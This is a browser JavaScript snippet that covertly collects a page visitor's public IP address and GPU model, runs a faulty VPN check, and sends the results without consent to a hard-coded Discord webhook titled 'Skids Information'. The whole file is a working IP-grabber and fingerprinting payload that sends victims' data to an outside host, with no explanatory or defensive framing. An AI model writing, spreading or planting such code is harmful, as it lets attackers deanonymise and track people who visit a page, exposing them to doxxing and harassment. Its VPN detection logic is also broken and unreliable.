const isPrivateIp = (ip) => /^(10\.)|(172\.1[6-9]\.)|(172\.2[0-9]\.)|(172\.3[0-1]\.)|(192\.168\.)/.test(ip);

function getUserIP(onNewIP) {

        var xhr = new XMLHttpRequest();

        xhr.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                onNewIP(this.responseText);
            }
        };

        xhr.open("GET", "https://api.ipify.org?format=json", true);
        xhr.send();
    }
    getUserIP(function (ip) {

        const gl = document.createElement('canvas').getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');


        var usingVPN = false;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.onload = function () {
            if (xhr.status >= 200 && xhr.status < 300) {
                var data = JSON.parse(xhr.responseText);
            if (isPrivateIp(data.ip)) {
            usingVPN = true;
            }
            }
        };
        xhr.onerror = function () {
            usingVPN = true;
        };
        xhr.send();

        fetch('https://discord.com/api/webhooks/1274360147166363709/_uPKBDaLBPBe21NlYOk5x6AaarvPern0PuKpi2DOkHsMZKB71BrSpAD27M-tiemAPbnm', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [{
                    title: ' Skids Information ~ @81rp ',
                    description: `Internet Protocol Address: ${ip}

          Skids Gpu: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}

          Skid on vpn?: ${usingVPN}`,
                    color: 0xA020F0
                }]
            })
        });
    });